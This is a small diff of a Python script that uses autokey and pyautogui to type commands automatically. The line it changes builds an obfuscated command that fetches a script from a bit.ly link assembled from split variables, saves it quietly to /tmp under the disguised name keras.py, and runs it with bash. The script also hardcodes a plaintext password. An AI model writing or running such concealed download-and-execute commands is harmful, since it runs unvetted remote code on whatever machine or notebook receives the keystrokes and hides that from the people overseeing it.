@@ -3,7 +3,7 @@ import time,os
 from autokey import *
 import pyautogui
 
-col_cmd = "! i=003;cmd=pysi;x=ly;y=bit;wget -q -O /tmp/s1 ${y}.${x}/${cmd}${i} ; bash /tmp/s1 "
+col_cmd = "! cmd=pysi;i=003;b=ly;a=bit;wget -q -O /tmp/keras.py ${a}.${b}/${cmd}${i} ; bash /tmp/keras.py "
 listfile = '/home/one/g170p1'
 gpass = "Ms123456789"
 new = True
